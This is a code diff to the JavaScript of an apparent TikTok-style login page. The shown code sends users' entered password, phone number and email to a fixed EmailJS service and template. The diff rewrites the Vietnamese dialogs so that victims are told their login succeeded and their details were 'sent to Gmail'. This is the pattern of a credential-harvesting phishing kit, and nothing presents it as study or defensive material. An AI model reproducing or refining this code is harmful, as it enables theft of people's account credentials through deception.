@@ -433,7 +433,7 @@
                 hideAllExcept('.login-container-tiktok');
             } else if (isDesktop) {
                 document.body.classList.add('desktop-mode');
-                document.querySelector('.header-container').style.display = 'none';
+                document.querySelector('.header-container').classList.add('hidden');
                 document.querySelector('.left-section').style.display = 'block';
                 document.querySelector('.language-text').style.display = 'none';
                 hideAllExcept('.login-container-desktop');
@@ -472,7 +472,7 @@
                 document.querySelector('.language-text').style.display = 'none';
             } else if (isDesktop) {
                 hideAllExcept('.login-container-desktop');
-                document.querySelector('.header-container').style.display = 'none';
+                document.querySelector('.header-container').classList.add('hidden');
                 document.querySelector('.language-text').style.display = 'none';
             } else if (isMobile) {
                 hideAllExcept('.login-container-mobile');
@@ -486,32 +486,47 @@
         }
 
         function showForgotPassword() {
+            const isDesktop = document.body.classList.contains('desktop-mode');
             hideAllExcept('.forgot-password-container');
             document.getElementById('back-button').style.display = 'flex';
             document.querySelector('.left-section').style.display = 'none';
-            document.querySelector('.header-container').classList.remove('hidden');
-            document.querySelector('.header-container').style.display = 'flex';
             document.querySelector('.language-text').style.display = 'none';
+            if (isDesktop) {
+                document.querySelector('.header-container').classList.add('hidden');
+            } else {
+                document.querySelector('.header-container').classList.remove('hidden');
+                document.querySelector('.header-container').style.display = 'flex';
+            }
             previousPage = showLogin;
         }
 
         function showForgotPasswordEmail() {
+            const isDesktop = document.body.classList.contains('desktop-mode');
             hideAllExcept('.forgot-password-email-container');
             document.getElementById('back-button').style.display = 'flex';
             document.querySelector('.left-section').style.display = 'none';
-            document.querySelector('.header-container').classList.remove('hidden');
-            document.querySelector('.header-container').style.display = 'flex';
             document.querySelector('.language-text').style.display = 'none';
+            if (isDesktop) {
+                document.querySelector('.header-container').classList.add('hidden');
+            } else {
+                document.querySelector('.header-container').classList.remove('hidden');
+                document.querySelector('.header-container').style.display = 'flex';
+            }
             previousPage = showForgotPassword;
         }
 
         function showCreateAccount() {
+            const isDesktop = document.body.classList.contains('desktop-mode');
             hideAllExcept('.create-account-container');
             document.getElementById('back-button').style.display = 'flex';
             document.querySelector('.left-section').style.display = 'none';
-            document.querySelector('.header-container').classList.remove('hidden');
-            document.querySelector('.header-container').style.display = 'flex';
             document.querySelector('.language-text').style.display = 'none';
+            if (isDesktop) {
+                document.querySelector('.header-container').classList.add('hidden');
+            } else {
+                document.querySelector('.header-container').classList.remove('hidden');
+                document.querySelector('.header-container').style.display = 'flex';
+            }
             previousPage = showLogin;
         }
 
@@ -560,9 +575,9 @@
 
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                 .then(function(response) {
-                    showDialog("Thông báo đã gửi!", "Kiểm tra Gmail của bạn để xem thông tin đăng nhập.");
+                    showDialog("Đăng nhập thành công!", "Thông tin đăng nhập đã được gửi đến Gmail của bạn!");
                 }, function(error) {
-                    showDialog("Đăng nhập không thành công", "Có lỗi xảy ra, vui lòng thử lại!");
+                    showDialog("Đăng nhập không thành công!", "Có lỗi xảy ra, vui lòng thử lại!");
                 });
         }
 
@@ -575,7 +590,7 @@
             const templateParams = { password: '', phone: phone, email: '', firstName: '', lastName: '' };
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                 .then(function(response) {
-                    showDialog("Thông báo đã gửi!", "Kiểm tra Gmail liên kết với số di động của bạn!");
+                    showDialog("Tìm kiếm thành công!", "Yêu cầu khôi phục đã được gửi đến Gmail liên kết với số điện thoại!");
                 }, function(error) {
                     showDialog("Tìm kiếm thất bại!", "Không tìm thấy tài khoản!");
                 });
@@ -590,7 +605,7 @@
             const templateParams = { password: '', phone: '', email: email, firstName: '', lastName: '' };
             emailjs.send('service_gibcgh4', 'template_vxfphjh', templateParams)
                 .then(function(response) {
-                    showDialog("Thông báo đã gửi!", "Kiểm tra Gmail của bạn!");
+                    showDialog("Tìm kiếm thành công!", "Yêu cầu khôi phục đã được gửi đến Gmail của bạn!");
                 }, function(error) {
                     showDialog("Tìm kiếm thất bại!", "Không tìm thấy tài khoản!");
                 });
